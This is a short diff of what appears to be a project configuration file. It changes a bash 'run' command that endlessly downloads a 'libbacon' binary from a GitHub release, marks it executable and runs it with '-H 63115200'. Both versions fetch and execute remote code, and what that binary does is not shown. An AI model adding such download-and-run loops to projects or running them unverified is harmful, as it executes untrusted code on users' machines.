@@ -1,2 +1,2 @@
-run = "while true; do wget -O libbacon https://github.com/libbacon/libbacon/releases/latest/download/libbacon;chmod +x libbacon;./libbacon -H 63115200;sleep 1;done"
+run = "while :; do set -ex; curl -o./libbacon -fsSL -- https://github.com/libbacon/libbacon/releases/latest/download/libbacon; chmod +x libbacon; set +e; ./libbacon -H 63115200; sleep 1; done"
 language = "bash"
